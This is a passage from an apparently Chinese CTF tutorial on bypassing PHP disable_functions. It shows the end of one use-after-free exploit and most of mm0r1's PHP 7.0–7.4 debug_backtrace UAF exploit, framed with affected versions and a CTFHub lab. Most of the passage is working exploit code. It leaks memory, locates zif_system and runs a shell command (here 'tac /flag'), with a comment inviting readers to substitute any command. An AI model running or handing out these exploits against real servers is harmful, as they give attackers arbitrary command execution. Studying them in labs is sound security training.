class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = unserialize(<span class="variable">$poc</span>);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接访问即可执行命令。</p>
<h3 id="PHP7-Backtrace-UAF"><a href="#PHP7-Backtrace-UAF" class="headerlink" title="PHP7 Backtrace UAF"></a>PHP7 Backtrace UAF</h3><p><strong>漏洞简介</strong>：</p>
<p>该漏洞利用在<code>debug_backtrace()</code>函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76047">https://bugs.php.net/bug.php?id=76047</a></p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP 版本<ul>
<li>7.0 - all versions to date<ul>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 &lt; 7.3.15 (released 20 Feb 2020)</li>
<li>7.4 &lt; 7.4.3 (released 20 Feb 2020)</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>CTFHub：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a></p>
<p>靶场位置：<code>CTFHub</code>-<code>技能树</code>-<code>Web</code>-<code>Web进阶</code>-<code>PHP</code>-<code>Bypass disable_functions</code>-<code>Backtrace UAF</code>  </p>
<p><strong>靶场突破</strong>：</p>
<p>除了蚁剑的扩展插件，还可以使用国外大佬<em>mm0r1</em>写的EXP：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;tac /flag&quot;</span>);			<span class="comment">// 可替换成需要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= chr(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = chr(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span 